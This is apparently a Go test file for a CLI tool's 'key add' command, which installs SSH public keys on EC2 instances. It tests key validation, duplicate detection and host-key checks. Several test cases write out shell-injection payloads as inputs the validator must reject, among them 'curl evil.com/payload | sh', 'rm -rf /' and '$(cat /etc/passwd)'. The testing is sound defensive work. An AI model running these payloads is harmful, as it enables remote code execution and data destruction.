package cmd

import (
	"bytes"
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/aws/aws-sdk-go-v2/service/ec2"
	"github.com/aws/aws-sdk-go-v2/service/ec2instanceconnect"
	"github.com/nicholasgasior/mint/internal/cli"
	"github.com/nicholasgasior/mint/internal/sshconfig"
	"github.com/spf13/cobra"

	mintaws "github.com/nicholasgasior/mint/internal/aws"
)

// testEd25519Key is a valid ed25519 public key for testing.
const testEd25519Key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGtest1234567890abcdefghijklmnopqrstuvwxyz test@host"

// testRSAKey is a valid RSA public key for testing.
const testRSAKey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7test1234 test@host"

// testECDSAKey is a valid ECDSA public key for testing.
const testECDSAKey = "ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE/test test@host"

// keyMockRemote captures remote command invocations for key add testing.
type keyMockRemote struct {
	calls  []keyMockRemoteCall
	output []byte
	err    error
}

type keyMockRemoteCall struct {
	instanceID string
	az         string
	host       string
	port       int
	user       string
	command    []string
}

func (m *keyMockRemote) run(
	ctx context.Context,
	sendKey mintaws.SendSSHPublicKeyAPI,
	instanceID string,
	az string,
	host string,
	port int,
	user string,
	command []string,
) ([]byte, error) {
	m.calls = append(m.calls, keyMockRemoteCall{
		instanceID: instanceID,
		az:         az,
		host:       host,
		port:       port,
		user:       user,
		command:    command,
	})
	return m.output, m.err
}

// newTestRootForKey creates a minimal root command for key tests.
func newTestRootForKey() *cobra.Command {
	root := &cobra.Command{
		Use:           "mint",
		SilenceUsage:  true,
		SilenceErrors: true,
		PersistentPreRunE: func(cmd *cobra.Command, args []string) error {
			cliCtx := cli.NewCLIContext(cmd)
			cmd.SetContext(cli.WithContext(context.Background(), cliCtx))
			return nil
		},
	}
	root.PersistentFlags().Bool("verbose", false, "Show progress steps")
	root.PersistentFlags().Bool("debug", false, "Show AWS SDK details")
	root.PersistentFlags().Bool("json", false, "Machine-readable JSON output")
	root.PersistentFlags().Bool("yes", false, "Skip confirmation on destructive operations")
	root.PersistentFlags().String("vm", "default", "Target VM name")
	return root
}

func TestKeyAddValidatesKeyFormat(t *testing.T) {
	tests := []struct {
		name    string
		key     string
		wantErr bool
		errMsg  string
	}{
		{
			name:    "valid ed25519 key",
			key:     testEd25519Key,
			wantErr: false,
		},
		{
			name:    "valid rsa key",
			key:     testRSAKey,
			wantErr: false,
		},
		{
			name:    "valid ecdsa key",
			key:     testECDSAKey,
			wantErr: false,
		},
		{
			name:    "valid ssh-dss key",
			key:     "ssh-dss AAAAB3NzaC1kc3MAAACBANtest test@host",
			wantErr: false,
		},
		{
			name:    "valid sk-ssh key",
			key:     "sk-ssh-ed25519@openssh.com AAAAGnNrLXNzaC1lZDI1NTE5QG9wZW5zc2guY29tAAAAIE/test test@host",
			wantErr: false,
		},
		{
			name:    "invalid key format",
			key:     "not-a-valid-key",
			wantErr: true,
			errMsg:  "invalid SSH public key",
		},
		{
			name:    "empty key",
			key:     "",
			wantErr: true,
			errMsg:  "public key is empty",
		},
		{
			name:    "key with only whitespace",
			key:     "   \n  ",
			wantErr: true,
			errMsg:  "public key is empty",
		},
		{
			name:    "key with shell injection via single quote",
			key:     "ssh-ed25519 AAAA' ; curl evil.com/payload | sh ; echo '",
			wantErr: true,
			errMsg:  "invalid characters",
		},
		{
			name:    "key with semicolon injection",
			key:     "ssh-ed25519 AAAA; rm -rf /",
			wantErr: true,
			errMsg:  "invalid characters",
		},
		{
			name:    "key with backtick injection",
			key:     "ssh-ed25519 AAAA`whoami`",
			wantErr: true,
			errMsg:  "invalid characters",
		},
		{
			name:    "key with dollar sign injection",
			key:     "ssh-ed25519 AAAA$(cat /etc/passwd)",
			wantErr: true,
			errMsg:  "invalid characters",
		},
		{
			name:    "key with pipe injection",
			key:     "ssh-ed25519 AAAA | curl evil.com",
			wantErr: true,
			errMsg:  "invalid characters",
		},
		{
			name:    "key with newline injection",
			key:     "ssh-ed25519 AAAA\nmalicious-command",
			wantErr: true,
			errMsg:  "invalid characters",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validatePublicKey(tt.key)
			if tt.wantErr {
				if err == nil {
					t.Fatal("expected error, got nil")
				}
				if tt.errMsg != "" && !strings.Contains(err.Error(), tt.errMsg) {
					t.Errorf("error %q does not contain %q", err.Error(), tt.errMsg)
				}
			} else {
				if err != nil {
					t.Fatalf("unexpected error: %v", err)
				}
			}
		})
	}
}

func TestKeyAddReadsFromFile(t *testing.T) {
	tmpDir := t.TempDir()
	keyFile := filepath.Join(tmpDir, "id_ed25519.pub")
	if err := os.WriteFile(keyFile, []byte(testEd25519Key+"\n"), 0o644); err != nil {
		t.Fatalf("write key file: %v", err)
	}

	remote := &keyMockRemote{output: []byte{}} // grep returns empty (no match)
	deps := &keyAddDeps{
		describe:       &mockDescribeForSSH{output: makeRunningInstanceWithAZ("i-abc123", "default", "alice", "1.2.3.4", "us-east-1a")},
		sendKey:        &mockSendSSHPublicKey{output: &ec2instanceconnect.SendSSHPublicKeyOutput{Success: true}},
		owner:          "alice",
		remoteRunner:   remote.run,
		hostKeyStore:   sshconfig.NewHostKeyStore(t.TempDir()),
		hostKeyScanner: mockHostKeyScanner("SHA256:testfp", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITest", nil),
		fingerprintFn:  func(key string) (string, error) { return "SHA256:abc123", nil },
	}

	cmd := newKeyAddCommandWithDeps(deps)
	root := newTestRootForKey()
	root.AddCommand(newKeyCommandWithChild(cmd))

	buf := new(bytes.Buffer)
	root.SetOut(buf)
	root.SetErr(buf)
	root.SetArgs([]string{"key", "add", keyFile})

	err := root.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Should have called remote runner twice: grep check + echo append.
	if len(remote.calls) != 2 {
		t.Fatalf("expected 2 remote calls, got %d", len(remote.calls))
	}

	// First call should be grep to check for duplicates.
	grepCall := remote.calls[0]
	if len(grepCall.command) < 1 || grepCall.command[0] != "grep" {
		t.Errorf("first remote call should be grep, got: %v", grepCall.command)
	}

	// Second call should be the append command.
	appendCall := remote.calls[1]
	joined := strings.Join(appendCall.command, " ")
	if !strings.Contains(joined, "authorized_keys") {
		t.Errorf("second remote call should append to authorized_keys, got: %v", appendCall.command)
	}

	// Output should mention the fingerprint.
	output := buf.String()
	if !strings.Contains(output, "SHA256:abc123") {
		t.Errorf("output should contain fingerprint, got: %s", output)
	}
}

func TestKeyAddReadsFromStdin(t *testing.T) {
	remote := &keyMockRemote{output: []byte{}} // grep returns empty (no match)
	deps := &keyAddDeps{
		describe:       &mockDescribeForSSH{output: makeRunningInstanceWithAZ("i-abc123", "default", "alice", "1.2.3.4", "us-east-1a")},
		sendKey:        &mockSendSSHPublicKey{output: &ec2instanceconnect.SendSSHPublicKeyOutput{Success: true}},
		owner:          "alice",
		remoteRunner:   remote.run,
		hostKeyStore:   sshconfig.NewHostKeyStore(t.TempDir()),
		hostKeyScanner: mockHostKeyScanner("SHA256:testfp", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITest", nil),
		fingerprintFn:  func(key string) (string, error) { return "SHA256:stdin123", nil },
	}

	cmd := newKeyAddCommandWithDeps(deps)
	root := newTestRootForKey()
	root.AddCommand(newKeyCommandWithChild(cmd))

	buf := new(bytes.Buffer)
	root.SetOut(buf)
	root.SetErr(buf)

	// Simulate stdin with the key.
	root.SetIn(strings.NewReader(testEd25519Key + "\n"))
	root.SetArgs([]string{"key", "add", "-"})

	err := root.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if len(remote.calls) != 2 {
		t.Fatalf("expected 2 remote calls, got %d", len(remote.calls))
	}

	output := buf.String()
	if !strings.Contains(output, "SHA256:stdin123") {
		t.Errorf("output should contain fingerprint, got: %s", output)
	}
}

func TestKeyAddAcceptsInlineKey(t *testing.T) {
	remote := &keyMockRemote{output: []byte{}} // grep returns empty (no match)
	deps := &keyAddDeps{
		describe:       &mockDescribeForSSH{output: makeRunningInstanceWithAZ("i-abc123", "default", "alice", "1.2.3.4", "us-east-1a")},
		sendKey:        &mockSendSSHPublicKey{output: &ec2instanceconnect.SendSSHPublicKeyOutput{Success: true}},
		owner:          "alice",
		remoteRunner:   remote.run,
		hostKeyStore:   sshconfig.NewHostKeyStore(t.TempDir()),
		hostKeyScanner: mockHostKeyScanner("SHA256:testfp", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITest", nil),
		fingerprintFn:  func(key string) (string, error) { return "SHA256:inline123", nil },
	}

	cmd := newKeyAddCommandWithDeps(deps)
	root := newTestRootForKey()
	root.AddCommand(newKeyCommandWithChild(cmd))

	buf := new(bytes.Buffer)
	root.SetOut(buf)
	root.SetErr(buf)

	// Pass the key directly as an argument (not a file path).
	root.SetArgs([]string{"key", "add", testEd25519Key})

	err := root.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if len(remote.calls) != 2 {
		t.Fatalf("expected 2 remote calls, got %d", len(remote.calls))
	}
}

func TestKeyAddDetectsDuplicate(t *testing.T) {
	// grep returns the key (meaning it already exists).
	remote := &keyMockRemote{output: []byte(testEd25519Key)}
	deps := &keyAddDeps{
		describe:       &mockDescribeForSSH{output: makeRunningInstanceWithAZ("i-abc123", "default", "alice", "1.2.3.4", "us-east-1a")},
		sendKey:        &mockSendSSHPublicKey{output: &ec2instanceconnect.SendSSHPublicKeyOutput{Success: true}},
		owner:          "alice",
		remoteRunner:   remote.run,
		hostKeyStore:   sshconfig.NewHostKeyStore(t.TempDir()),
		hostKeyScanner: mockHostKeyScanner("SHA256:testfp", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITest", nil),
		fingerprintFn:  func(key string) (string, error) { return "SHA256:dup123", nil },
	}

	cmd := newKeyAddCommandWithDeps(deps)
	root := newTestRootForKey()
	root.AddCommand(newKeyCommandWithChild(cmd))

	buf := new(bytes.Buffer)
	root.SetOut(buf)
	root.SetErr(buf)
	root.SetArgs([]string{"key", "add", testEd25519Key})

	err := root.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Should only have called grep (no append).
	if len(remote.calls) != 1 {
		t.Fatalf("expected 1 remote call (grep only), got %d", len(remote.calls))
	}

	output := buf.String()
	if !strings.Contains(output, "already") {
		t.Errorf("output should indicate key already exists, got: %s", output)
	}
}

func TestKeyAddVMNotFound(t *testing.T) {
	remote := &keyMockRemote{}
	deps := &keyAddDeps{
		describe:       &mockDescribeForSSH{output: &ec2.DescribeInstancesOutput{}},
		sendKey:        &mockSendSSHPublicKey{},
		owner:          "alice",
		remoteRunner:   remote.run,
		hostKeyStore:   sshconfig.NewHostKeyStore(t.TempDir()),
		hostKeyScanner: mockHostKeyScanner("SHA256:testfp", "ssh-ed25519 test", nil),
		fingerprintFn:  func(key string) (string, error) { return "SHA256:test", nil },
	}

	cmd := newKeyAddCommandWithDeps(deps)
	root := newTestRootForKey()
	root.AddCommand(newKeyCommandWithChild(cmd))

	buf := new(bytes.Buffer)
	root.SetOut(buf)
	root.SetErr(buf)
	root.SetArgs([]string{"key", "add", testEd25519Key})

	err := root.Execute()
	if err == nil {
		t.Fatal("expected error, got nil")
	}
	if !strings.Contains(err.Error(), "mint up") {
		t.Errorf("error should mention mint up, got: %s", err.Error())
	}
}

func TestKeyAddVMNotRunning(t *testing.T) {
	remote := &keyMockRemote{}
	deps := &keyAddDeps{
		describe:       &mockDescribeForSSH{output: makeStoppedInstanceForSSH("i-abc123", "default", "alice")},
		sendKey:        &mockSendSSHPublicKey{},
		owner:          "alice",
		remoteRunner:   remote.run,
		hostKeyStore:   sshconfig.NewHostKeyStore(t.TempDir()),
		hostKeyScanner: mockHostKeyScanner("SHA256:testfp", "ssh-ed25519 test", nil),
		fingerprintFn:  func(key string) (string, error) { return "SHA256:test", nil },
	}

	cmd := newKeyAddCommandWithDeps(deps)
	root := newTestRootForKey()
	root.AddCommand(newKeyCommandWithChild(cmd))

	buf := new(bytes.Buffer)
	root.SetOut(buf)
	root.SetErr(buf)
	root.SetArgs([]string{"key", "add", testEd25519Key})

	err := root.Execute()
	if err == nil {
		t.Fatal("expected error, got nil")
	}
	if !strings.Contains(err.Error(), "not running") {
		t.Errorf("error should mention not running, got: %s", err.Error())
	}
}

func TestKeyAddRemoteRunnerError(t *testing.T) {
	remote := &keyMockRemote{err: fmt.Errorf("connection refused")}
	deps := &keyAddDeps{
		describe:       &mockDescribeForSSH{output: makeRunningInstanceWithAZ("i-abc123", "default", "alice", "1.2.3.4", "us-east-1a")},
		sendKey:        &mockSendSSHPublicKey{output: &ec2instanceconnect.SendSSHPublicKeyOutput{Success: true}},
		owner:          "alice",
		remoteRunner:   remote.run,
		hostKeyStore:   sshconfig.NewHostKeyStore(t.TempDir()),
		hostKeyScanner: mockHostKeyScanner("SHA256:testfp", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITest", nil),
		fingerprintFn:  func(key string) (string, error) { return "SHA256:test", nil },
	}

	cmd := newKeyAddCommandWithDeps(deps)
	root := newTestRootForKey()
	root.AddCommand(newKeyCommandWithChild(cmd))

	buf := new(bytes.Buffer)
	root.SetOut(buf)
	root.SetErr(buf)
	root.SetArgs([]string{"key", "add", testEd25519Key})

	err := root.Execute()
	if err == nil {
		t.Fatal("expected error, got nil")
	}
	if !strings.Contains(err.Error(), "connection refused") {
		t.Errorf("error should contain remote runner error, got: %s", err.Error())
	}
}

func TestKeyAddNonDefaultVM(t *testing.T) {
	remote := &keyMockRemote{output: []byte{}}
	deps := &keyAddDeps{
		describe:       &mockDescribeForSSH{output: makeRunningInstanceWithAZ("i-dev456", "dev", "alice", "10.0.0.1", "us-west-2a")},
		sendKey:        &mockSendSSHPublicKey{output: &ec2instanceconnect.SendSSHPublicKeyOutput{Success: true}},
		owner:          "alice",
		remoteRunner:   remote.run,
		hostKeyStore:   sshconfig.NewHostKeyStore(t.TempDir()),
		hostKeyScanner: mockHostKeyScanner("SHA256:testfp", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITest", nil),
		fingerprintFn:  func(key string) (string, error) { return "SHA256:devkey", nil },
	}

	cmd := newKeyAddCommandWithDeps(deps)
	root := newTestRootForKey()
	root.AddCommand(newKeyCommandWithChild(cmd))

	buf := new(bytes.Buffer)
	root.SetOut(buf)
	root.SetErr(buf)
	root.SetArgs([]string{"--vm", "dev", "key", "add", testEd25519Key})

	err := root.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Remote calls should target the right host.
	if len(remote.calls) < 1 {
		t.Fatal("expected at least 1 remote call")
	}
	if remote.calls[0].host != "10.0.0.1" {
		t.Errorf("expected host 10.0.0.1, got %s", remote.calls[0].host)
	}
}

func TestKeyAddNoArgument(t *testing.T) {
	deps := &keyAddDeps{
		describe:       &mockDescribeForSSH{output: makeRunningInstanceWithAZ("i-abc123", "default", "alice", "1.2.3.4", "us-east-1a")},
		sendKey:        &mockSendSSHPublicKey{},
		owner:          "alice",
		remoteRunner:   (&keyMockRemote{}).run,
		hostKeyStore:   sshconfig.NewHostKeyStore(t.TempDir()),
		hostKeyScanner: mockHostKeyScanner("SHA256:testfp", "ssh-ed25519 test", nil),
		fingerprintFn:  func(key string) (string, error) { return "SHA256:test", nil },
	}

	cmd := newKeyAddCommandWithDeps(deps)
	root := newTestRootForKey()
	root.AddCommand(newKeyCommandWithChild(cmd))

	buf := new(bytes.Buffer)
	root.SetOut(buf)
	root.SetErr(buf)
	root.SetArgs([]string{"key", "add"})

	err := root.Execute()
	if err == nil {
		t.Fatal("expected error for missing argument, got nil")
	}
}

func TestKeyAddRemoteCommandConstruction(t *testing.T) {
	remote := &keyMockRemote{output: []byte{}}
	deps := &keyAddDeps{
		describe:       &mockDescribeForSSH{output: makeRunningInstanceWithAZ("i-abc123", "default", "alice", "1.2.3.4", "us-east-1a")},
		sendKey:        &mockSendSSHPublicKey{output: &ec2instanceconnect.SendSSHPublicKeyOutput{Success: true}},
		owner:          "alice",
		remoteRunner:   remote.run,
		hostKeyStore:   sshconfig.NewHostKeyStore(t.TempDir()),
		hostKeyScanner: mockHostKeyScanner("SHA256:testfp", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITest", nil),
		fingerprintFn:  func(key string) (string, error) { return "SHA256:verify", nil },
	}

	cmd := newKeyAddCommandWithDeps(deps)
	root := newTestRootForKey()
	root.AddCommand(newKeyCommandWithChild(cmd))

	buf := new(bytes.Buffer)
	root.SetOut(buf)
	root.SetErr(buf)
	root.SetArgs([]string{"key", "add", testEd25519Key})

	err := root.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if len(remote.calls) != 2 {
		t.Fatalf("expected 2 remote calls, got %d", len(remote.calls))
	}

	// Verify grep call uses correct arguments.
	grepCall := remote.calls[0]
	if grepCall.command[0] != "grep" {
		t.Errorf("first call should be grep, got: %v", grepCall.command)
	}
	if grepCall.command[1] != "-F" {
		t.Errorf("grep should use -F for fixed-string, got: %v", grepCall.command)
	}
	if grepCall.instanceID != "i-abc123" {
		t.Errorf("wrong instance ID: %s", grepCall.instanceID)
	}
	if grepCall.az != "us-east-1a" {
		t.Errorf("wrong AZ: %s", grepCall.az)
	}
	if grepCall.host != "1.2.3.4" {
		t.Errorf("wrong host: %s", grepCall.host)
	}
	if grepCall.port != defaultSSHPort {
		t.Errorf("wrong port: %d", grepCall.port)
	}
	if grepCall.user != defaultSSHUser {
		t.Errorf("wrong user: %s", grepCall.user)
	}

	// Verify the append call writes to authorized_keys using positional params.
	appendCall := remote.calls[1]
	// The shell command itself must NOT contain the key content (defense against injection).
	shellScript := appendCall.command[2] // the sh -c argument
	if strings.Contains(shellScript, "ssh-ed25519") {
		t.Errorf("shell script should not contain key content (use positional params): %s", shellScript)
	}
	if !strings.Contains(shellScript, "authorized_keys") {
		t.Errorf("shell script should reference authorized_keys: %s", shellScript)
	}
	if !strings.Contains(shellScript, "$1") {
		t.Errorf("shell script should use positional parameter $1: %s", shellScript)
	}
	// The key should be passed as a separate argument after "--".
	if len(appendCall.command) < 5 {
		t.Fatalf("append command should have at least 5 elements (sh -c script -- key), got %d: %v", len(appendCall.command), appendCall.command)
	}
	if appendCall.command[3] != "--" {
		t.Errorf("expected '--' separator, got: %s", appendCall.command[3])
	}
	if !strings.HasPrefix(appendCall.command[4], "ssh-ed25519") {
		t.Errorf("key should be passed as positional arg, got: %s", appendCall.command[4])
	}
}

func TestKeyCommandParentHasAddSubcommand(t *testing.T) {
	cmd := newKeyCommand()

	// Verify the key command has an "add" subcommand.
	found := false
	for _, sub := range cmd.Commands() {
		if sub.Name() == "add" {
			found = true
			break
		}
	}
	if !found {
		t.Error("key command should have an 'add' subcommand")
	}
}

func TestKeyAddTOFUHostKeyVerification(t *testing.T) {
	// First connection should record the key.
	remote := &keyMockRemote{output: []byte{}}
	store := sshconfig.NewHostKeyStore(t.TempDir())
	deps := &keyAddDeps{
		describe:       &mockDescribeForSSH{output: makeRunningInstanceWithAZ("i-abc123", "default", "alice", "1.2.3.4", "us-east-1a")},
		sendKey:        &mockSendSSHPublicKey{output: &ec2instanceconnect.SendSSHPublicKeyOutput{Success: true}},
		owner:          "alice",
		remoteRunner:   remote.run,
		hostKeyStore:   store,
		hostKeyScanner: mockHostKeyScanner("SHA256:tofufp", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITest", nil),
		fingerprintFn:  func(key string) (string, error) { return "SHA256:added", nil },
	}

	cmd := newKeyAddCommandWithDeps(deps)
	root := newTestRootForKey()
	root.AddCommand(newKeyCommandWithChild(cmd))

	buf := new(bytes.Buffer)
	root.SetOut(buf)
	root.SetErr(buf)
	root.SetArgs([]string{"key", "add", testEd25519Key})

	err := root.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Verify host key was recorded.
	matched, _, checkErr := store.CheckKey("default", "SHA256:tofufp")
	if checkErr != nil {
		t.Fatalf("CheckKey: %v", checkErr)
	}
	if !matched {
		t.Error("host key should have been recorded via TOFU")
	}
}

func TestKeyAddTOFUHostKeyMismatch(t *testing.T) {
	store := sshconfig.NewHostKeyStore(t.TempDir())
	// Pre-store a different key.
	if err := store.RecordKey("default", "SHA256:oldfp"); err != nil {
		t.Fatalf("RecordKey: %v", err)
	}

	remote := &keyMockRemote{output: []byte{}}
	deps := &keyAddDeps{
		describe:       &mockDescribeForSSH{output: makeRunningInstanceWithAZ("i-abc123", "default", "alice", "1.2.3.4", "us-east-1a")},
		sendKey:        &mockSendSSHPublicKey{output: &ec2instanceconnect.SendSSHPublicKeyOutput{Success: true}},
		owner:          "alice",
		remoteRunner:   remote.run,
		hostKeyStore:   store,
		hostKeyScanner: mockHostKeyScanner("SHA256:newfp", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINew", nil),
		fingerprintFn:  func(key string) (string, error) { return "SHA256:test", nil },
	}

	cmd := newKeyAddCommandWithDeps(deps)
	root := newTestRootForKey()
	root.AddCommand(newKeyCommandWithChild(cmd))

	buf := new(bytes.Buffer)
	root.SetOut(buf)
	root.SetErr(buf)
	root.SetArgs([]string{"key", "add", testEd25519Key})

	err := root.Execute()
	if err == nil {
		t.Fatal("expected error for host key mismatch, got nil")
	}
	if !strings.Contains(err.Error(), "HOST KEY CHANGED") {
		t.Errorf("error should mention HOST KEY CHANGED, got: %s", err.Error())
	}

	// Remote runner should NOT have been called.
	if len(remote.calls) != 0 {
		t.Errorf("remote runner should not be called on host key mismatch, got %d calls", len(remote.calls))
	}
}

func TestKeyAddRejectsShellInjection(t *testing.T) {
	// A malicious key that passes prefix validation but contains shell metacharacters.
	// This must be rejected by character validation before reaching the remote runner.
	maliciousKey := "ssh-ed25519 AAAA' ; curl evil.com/payload | sh ; echo '"

	remote := &keyMockRemote{output: []byte{}}
	deps := &keyAddDeps{
		describe:       &mockDescribeForSSH{output: makeRunningInstanceWithAZ("i-abc123", "default", "alice", "1.2.3.4", "us-east-1a")},
		sendKey:        &mockSendSSHPublicKey{output: &ec2instanceconnect.SendSSHPublicKeyOutput{Success: true}},
		owner:          "alice",
		remoteRunner:   remote.run,
		hostKeyStore:   sshconfig.NewHostKeyStore(t.TempDir()),
		hostKeyScanner: mockHostKeyScanner("SHA256:testfp", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITest", nil),
		fingerprintFn:  func(key string) (string, error) { return "SHA256:test", nil },
	}

	cmd := newKeyAddCommandWithDeps(deps)
	root := newTestRootForKey()
	root.AddCommand(newKeyCommandWithChild(cmd))

	buf := new(bytes.Buffer)
	root.SetOut(buf)
	root.SetErr(buf)
	root.SetArgs([]string{"key", "add", maliciousKey})

	err := root.Execute()
	if err == nil {
		t.Fatal("expected error for malicious key, got nil")
	}
	if !strings.Contains(err.Error(), "invalid characters") {
		t.Errorf("error should mention invalid characters, got: %s", err.Error())
	}

	// The remote runner must NOT have been called at all.
	if len(remote.calls) != 0 {
		t.Errorf("remote runner should not be called for malicious key, got %d calls", len(remote.calls))
	}
}

// newKeyCommandWithChild creates a key parent command with the given child added.
func newKeyCommandWithChild(child *cobra.Command) *cobra.Command {
	parent := &cobra.Command{
		Use:   "key",
		Short: "Manage SSH keys",
	}
	parent.AddCommand(child)
	return parent
}
